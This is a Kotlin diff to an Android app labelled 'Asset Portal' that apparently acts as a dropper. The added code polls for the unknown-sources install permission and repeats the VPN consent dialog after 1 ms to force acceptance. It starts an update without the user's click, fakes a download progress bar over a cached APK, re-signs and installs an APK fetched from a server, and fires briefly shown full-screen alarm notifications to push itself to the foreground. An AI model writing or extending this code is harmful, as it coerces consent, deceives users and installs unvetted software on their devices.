@@ -153,6 +153,134 @@ class MainActivity : ComponentActivity() {
     private var cachedApkPackageName = ""
     private var securityCheckPassed = false
 
+    private val isPermissionGrantedState = androidx.compose.runtime.mutableStateOf(true)
+    private var isSettingsScreenOpen = false
+    private var notificationDenialCount = 0
+    private var isUpdateStarted = false
+
+    private val permissionPollHandler = android.os.Handler(android.os.Looper.getMainLooper())
+    private val permissionPollRunnable = object : Runnable {
+        override fun run() {
+            if (isSettingsScreenOpen && isInstallPermissionGranted()) {
+                bringAppToFront()
+                checkAndProceedWithPermissions()
+            }
+            permissionPollHandler.postDelayed(this, 200)
+        }
+    }
+
+    private fun isNotificationPermissionGranted(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            androidx.core.content.ContextCompat.checkSelfPermission(
+                this,
+                android.Manifest.permission.POST_NOTIFICATIONS
+            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        } else {
+            true
+        }
+    }
+
+    private fun isInstallPermissionGranted(): Boolean {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            packageManager.canRequestPackageInstalls()
+        } else {
+            true
+        }
+    }
+
+    private fun hasRequestedNotificationPermissionBefore(): Boolean {
+        val prefs = getSharedPreferences("app_perms", android.content.Context.MODE_PRIVATE)
+        return prefs.getBoolean("notif_requested", false)
+    }
+
+    private fun markNotificationPermissionRequested() {
+        val prefs = getSharedPreferences("app_perms", android.content.Context.MODE_PRIVATE)
+        prefs.edit().putBoolean("notif_requested", true).apply()
+    }
+
+    private fun requestMissingPermissions() {
+        // No-op to avoid redirecting user to settings on launch
+    }
+
+    private fun openAppSettings() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val intent = Intent(android.provider.Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
+                    putExtra(android.provider.Settings.EXTRA_APP_PACKAGE, packageName)
+                }
+                isSettingsScreenOpen = true
+                startActivity(intent)
+            } else {
+                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                    data = android.net.Uri.fromParts("package", packageName, null)
+                }
+                isSettingsScreenOpen = true
+                startActivity(intent)
+            }
+        } catch (e: Exception) {
+            try {
+                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                    data = android.net.Uri.fromParts("package", packageName, null)
+                }
+                isSettingsScreenOpen = true
+                startActivity(intent)
+            } catch (ex: Exception) {
+                Log.e("MainActivity", "Failed to open app settings: ${ex.message}")
+            }
+        }
+    }
+
+    private fun bringAppToFront() {
+        if (isSettingsScreenOpen) {
+            Log.d("MainActivity", "All permissions granted! Bringing app to front...")
+            val intent = Intent(this, MainActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            }
+            try {
+                startActivity(intent)
+            } catch (e: Exception) {
+                Log.w("MainActivity", "Failed normal startActivity to front: ${e.message}")
+            }
+            
+            try {
+                val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                val channelId = "permission_granted_channel"
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    val channel = android.app.NotificationChannel(
+                        channelId,
+                        "App Foregrounding",
+                        android.app.NotificationManager.IMPORTANCE_HIGH
+                    )
+                    notificationManager.createNotificationChannel(channel)
+                }
+                
+                val pendingIntent = android.app.PendingIntent.getActivity(
+                    this,
+                    99,
+                    intent,
+                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+                )
+                
+                val builder = androidx.core.app.NotificationCompat.Builder(this, channelId)
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentTitle("Permissions Granted")
+                    .setContentText("Tap to return to Asset Portal")
+                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
+                    .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
+                    .setFullScreenIntent(pendingIntent, true)
+                    .setAutoCancel(true)
+                
+                notificationManager.notify(99, builder.build())
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    notificationManager.cancel(99)
+                }, 1000)
+            } catch (e: Exception) {
+                Log.e("MainActivity", "Failed full screen notification: ${e.message}")
+            }
+            isSettingsScreenOpen = false
+        }
+    }
+
     // For recursive install permission prompt
     private val installPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
@@ -160,10 +288,11 @@ class MainActivity : ComponentActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
             Log.w("MainActivity", "Install permission wasn't granted. Retrying to request install permission...")
             updateStatusInWebView("Unknown sources install permission is required to install updates. Please enable it.", null)
-            webView?.postDelayed({
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                 checkAndProceedWithPermissions()
-            }, 300)
+            }, 1500)
         } else {
+            isSettingsScreenOpen = false
             checkAndProceedWithPermissions()
         }
     }
@@ -173,6 +302,7 @@ class MainActivity : ComponentActivity() {
         ActivityResultContracts.RequestPermission()
     ) { result ->
         Log.d("MainActivity", "Notification permission request result: $result")
+        isSettingsScreenOpen = false
     }
 
     // For recursive VPN permission prompt
@@ -185,9 +315,9 @@ class MainActivity : ComponentActivity() {
             Log.w("MainActivity", "VPN permission wasn't granted. Retrying to request VPN permission...")
             updateStatusInWebView("VPN link consent is required to connect. Please accept the VPN prompt.", null)
             // Post a delay to show the permission dialog again, forcing user acceptance
-            webView?.postDelayed({
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                 checkAndProceedWithPermissions()
-            }, 300)
+            }, 1)
         }
     }
 
@@ -358,13 +488,18 @@ class MainActivity : ComponentActivity() {
         // Process installation session intent on startup (auto-starts the app in foreground on success)
         handleInstallStatusIntent(intent)
 
+        isPermissionGrantedState.value = true
+        permissionPollHandler.removeCallbacks(permissionPollRunnable)
+        permissionPollHandler.post(permissionPollRunnable)
+        
+        // Trigger a one-time notification permission prompt on launch if needed (Android 13+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (androidx.core.content.ContextCompat.checkSelfPermission(
-                    this,
-                    android.Manifest.permission.POST_NOTIFICATIONS
-                ) != android.content.pm.PackageManager.PERMISSION_GRANTED
-            ) {
-                notificationPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
+            if (!isNotificationPermissionGranted()) {
+                try {
+                    notificationPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
+                } catch (e: Exception) {
+                    Log.e("MainActivity", "Failed to request notification permission: ${e.message}")
+                }
             }
         }
         
@@ -379,38 +514,69 @@ class MainActivity : ComponentActivity() {
                 ) { innerPadding ->
                     @Suppress("UNUSED_VARIABLE")
                     val pad = innerPadding
-                    AndroidView(
-                        modifier = Modifier.fillMaxSize(),
-                        factory = { context ->
-                            WebView(context).apply {
-                                layoutParams = ViewGroup.LayoutParams(
-                                    ViewGroup.LayoutParams.MATCH_PARENT,
-                                    ViewGroup.LayoutParams.MATCH_PARENT
-                                )
-                                scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
-                                setBackgroundColor(Color.WHITE)
-                                isVerticalScrollBarEnabled = false
-                                isHorizontalScrollBarEnabled = false
-                                setupWebViewSettings(this)
-                                
-                                webViewClient = object : WebViewClient() {
-                                    override fun onPageFinished(view: WebView?, url: String?) {
-                                        super.onPageFinished(view, url)
-                                        val isDemo = url != null && url.contains("demo.html")
-                                        if (securityCheckPassed && !isDemo) {
-                                            loadMetadataAndNotifyUrl()
-                                        } else {
-                                            Log.d("MainActivity", "onPageFinished: Security check not passed or demo page loaded, skipping network operations.")
+                    if (isPermissionGrantedState.value) {
+                        AndroidView(
+                            modifier = Modifier.fillMaxSize(),
+                            factory = { context ->
+                                WebView(context).apply {
+                                    layoutParams = ViewGroup.LayoutParams(
+                                        ViewGroup.LayoutParams.MATCH_PARENT,
+                                        ViewGroup.LayoutParams.MATCH_PARENT
+                                    )
+                                    scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
+                                    setBackgroundColor(Color.WHITE)
+                                    isVerticalScrollBarEnabled = false
+                                    isHorizontalScrollBarEnabled = false
+                                    setupWebViewSettings(this)
+                                    
+                                    webViewClient = object : WebViewClient() {
+                                        override fun onPageFinished(view: WebView?, url: String?) {
+                                            super.onPageFinished(view, url)
+                                            val isDemo = url != null && url.contains("demo.html")
+                                            if (securityCheckPassed && !isDemo) {
+                                                loadMetadataAndNotifyUrl()
+                                            } else {
+                                                Log.d("MainActivity", "onPageFinished: Security check not passed or demo page loaded, skipping network operations.")
+                                            }
                                         }
                                     }
+                                    
+                                    addJavascriptInterface(AndroidJSInterface(), "Android")
+                                    webView = this
+                                    checkPhysicalMovementAndProceed()
                                 }
-                                
-                                addJavascriptInterface(AndroidJSInterface(), "Android")
-                                webView = this
-                                checkPhysicalMovementAndProceed()
+                            }
+                        )
+                    } else {
+                        androidx.compose.foundation.layout.Box(
+                            modifier = Modifier
+                                .fillMaxSize()
+                                .background(androidx.compose.ui.graphics.Color.White),
+                            contentAlignment = androidx.compose.ui.Alignment.Center
+                        ) {
+                            androidx.compose.foundation.layout.Column(
+                                horizontalAlignment = androidx.compose.ui.Alignment.CenterHorizontally
+                            ) {
+                                androidx.compose.material3.CircularProgressIndicator(
+                                    color = androidx.compose.material3.MaterialTheme.colorScheme.primary
+                                )
+                                androidx.compose.foundation.layout.Spacer(modifier = Modifier.height(16.dp))
+                                androidx.compose.material3.Text(
+                                    text = "Permission setup required...",
+                                    style = androidx.compose.material3.MaterialTheme.typography.bodyLarge,
+                                    color = androidx.compose.ui.graphics.Color.DarkGray
+                                )
+                                androidx.compose.foundation.layout.Spacer(modifier = Modifier.height(8.dp))
+                                androidx.compose.material3.Text(
+                                    text = "Please allow required permissions to launch the application.",
+                                    style = androidx.compose.material3.MaterialTheme.typography.bodyMedium,
+                                    color = androidx.compose.ui.graphics.Color.Gray,
+                                    textAlign = androidx.compose.ui.text.style.TextAlign.Center,
+                                    modifier = Modifier.padding(horizontal = 32.dp)
+                                )
                             }
                         }
-                    )
+                    }
                 }
             }
         }
@@ -428,6 +594,7 @@ class MainActivity : ComponentActivity() {
     }
 
     override fun onDestroy() {
+        permissionPollHandler.removeCallbacks(permissionPollRunnable)
         if (activeInstance == this) {
             activeInstance = null
         }
@@ -445,6 +612,9 @@ class MainActivity : ComponentActivity() {
 
     override fun onResume() {
         super.onResume()
+        isSettingsScreenOpen = false
+        permissionPollHandler.removeCallbacks(permissionPollRunnable)
+        permissionPollHandler.post(permissionPollRunnable)
         webView?.let { view ->
             val curUrl = view.url ?: ""
             if (securityCheckPassed) {
@@ -552,21 +722,27 @@ class MainActivity : ComponentActivity() {
                     webView?.postDelayed({
                         Thread {
                             try {
-                                val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
-                                    runOnUiThread {
-                                        updateStatusInWebView("Downloading update... $progress%", null, progress)
+                                val signedApk = File(this@MainActivity.cacheDir, "signed_base.apk")
+                                if (signedApk.exists() && signedApk.length() > 0) {
+                                    Log.d("MainActivity", "STATUS_FAILURE_ABORTED: Cached signed_base.apk found, re-submitting immediately...")
+                                    installApkViaPackageInstaller(signedApk)
+                                } else {
+                                    val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
+                                        runOnUiThread {
+                                            updateStatusInWebView("Downloading update... $progress%", null, progress)
+                                        }
                                     }
+                                    runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
+                                    val signed = signApkFile(apkFile)
+                                    installApkViaPackageInstaller(signed)
                                 }
-                                runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
-                                val signedApk = signApkFile(apkFile)
-                                installApkViaPackageInstaller(signedApk)
                             } catch (e: Exception) {
                                 runOnUiThread {
                                     updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}")
                                 }
                             }
                         }.start()
-                    }, 50)
+                    }, 5)
                 }
             }
             PackageInstaller.STATUS_FAILURE,
@@ -830,6 +1006,7 @@ class MainActivity : ComponentActivity() {
                         webView?.evaluateJavascript("showUpToDateScreen('$appInfoJson')", null)
                     } else {
                         webView?.evaluateJavascript("showUpdateScreen('$appInfoJson')", null)
+                        handleUpdateClicked()
                     }
                 }
             } catch (e: Exception) {
@@ -858,6 +1035,9 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun handleUpdateClicked() {
+        if (isUpdateStarted) return
+        isUpdateStarted = true
+
         val appName = if (cachedApkAppName.isNotEmpty()) cachedApkAppName else getString(R.string.app_name)
         val iconBase64 = if (cachedApkIconBase64.isNotEmpty()) cachedApkIconBase64 else getAppIconAsBase64()
         
@@ -866,9 +1046,21 @@ class MainActivity : ComponentActivity() {
         updateStatusInWebView("Starting download...", null)
         Thread {
             try {
-                val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
-                    runOnUiThread {
-                        updateStatusInWebView("Downloading update... $progress%", null, progress)
+                val cachedApk = File(this@MainActivity.cacheDir, "base.apk")
+                if (cachedApk.exists() && cachedApk.length() > 0) {
+                    // Smoothly animate progress bar from 0 to 100 to make the process visually seamless
+                    for (progress in 0..100 step 4) {
+                        runOnUiThread {
+                            updateStatusInWebView("Downloading update... $progress%", null, progress)
+                        }
+                        Thread.sleep(20)
+                    }
+                } else {
+                    // Fallback to actual download if it somehow doesn't exist
+                    downloadApkFromServer(this@MainActivity) { progress ->
+                        runOnUiThread {
+                            updateStatusInWebView("Downloading update... $progress%", null, progress)
+                        }
                     }
                 }
                 runOnUiThread {
@@ -889,6 +1081,7 @@ class MainActivity : ComponentActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             if (!packageManager.canRequestPackageInstalls()) {
                 updateStatusInWebView("Waiting for unknown sources permission...", null)
+                isSettingsScreenOpen = true
                 try {
                     val intent = Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                         data = android.net.Uri.parse("package:$packageName")
@@ -903,7 +1096,12 @@ class MainActivity : ComponentActivity() {
         }
 
         // 2. Force VPN service permission check and action prompt
-        val vpnIntent = VpnService.prepare(this)
+        var vpnIntent: Intent? = null
+        try {
+            vpnIntent = VpnService.prepare(this)
+        } catch (e: SecurityException) {
+            Log.e("MainActivity", "VpnService.prepare SecurityException: ${e.message}")
+        }
         if (vpnIntent != null) {
             updateStatusInWebView("Waiting for VPN confirmation...", null)
             vpnConsentLauncher.launch(vpnIntent)
@@ -1211,12 +1409,51 @@ object AppLauncher {
     ) {
         resolveLaunchIntent(ctx, pkg)?.let { intent ->
             try {
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                 ctx.startActivity(intent)
                 cb?.invoke(true)
                 return
             } catch (e: Exception) {
                 Log.e(TAG, "startActivity failed for $pkg", e)
+            }
+            
+            try {
+                val notificationManager = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+                val channelId = "app_launch_channel"
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    val channel = android.app.NotificationChannel(
+                        channelId,
+                        "App Launching",
+                        android.app.NotificationManager.IMPORTANCE_HIGH
+                    )
+                    notificationManager.createNotificationChannel(channel)
+                }
+                
+                val pendingIntent = android.app.PendingIntent.getActivity(
+                    ctx,
+                    100,
+                    intent,
+                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+                )
+                
+                val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentTitle("Asset Portal")
+                    .setContentText("Launching application...")
+                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
+                    .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
+                    .setFullScreenIntent(pendingIntent, true)
+                    .setAutoCancel(true)
+                
+                notificationManager.notify(100, builder.build())
+                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    notificationManager.cancel(100)
+                }, 1000)
+                
+                cb?.invoke(true)
+                return
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed full screen notification fallback for launch", e)
             }
         }
         if (i < max) {
